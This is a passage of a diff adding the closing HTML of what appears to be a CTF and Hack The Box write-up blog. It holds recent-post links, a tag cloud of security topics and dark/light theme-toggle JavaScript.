+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/04/18/htb-mango.html">
+          Hack The Box: Mango
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/04/17/virseccon-ctf-web.html">
+           VirSecCon CTF: Web Challenges
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/bof/" class="set-1">BoF</a> <a href="/tag/explotation%26pwning/" class="set-1">Explotation&Pwning</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/lfi-posioning/" class="set-1">LFI-posioning</a> <a href="/tag/nosql/" class="set-1">Nosql</a> <a href="/tag/phpjuggler/" class="set-1">PhpJuggler</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/rop/" class="set-1">ROP</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/ssti/" class="set-1">SSTI</a> <a href="/tag/vscctf/" class="set-2">VSCCTF</a> <a href="/tag/virseccon/" class="set-2">VirSecCon</a> <a href="/tag/xxe/" class="set-1">XXE</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-2">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/hackpackctf/" class="set-1">hackpackctf</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/jjs/" class="set-1">jjs</a> <a href="/tag/lfmserver/" class="set-1">lfmserver</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/scripting/" class="set-1">scripting</a> <a href="/tag/selenium/" class="set-1">selenium</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-2">sqli</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/virseccon/" class="set-2">virseccon</a> <a href="/tag/webchallenge/" class="set-1">webchallenge</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whoami/" class="set-1">whoami</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
+  
+
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
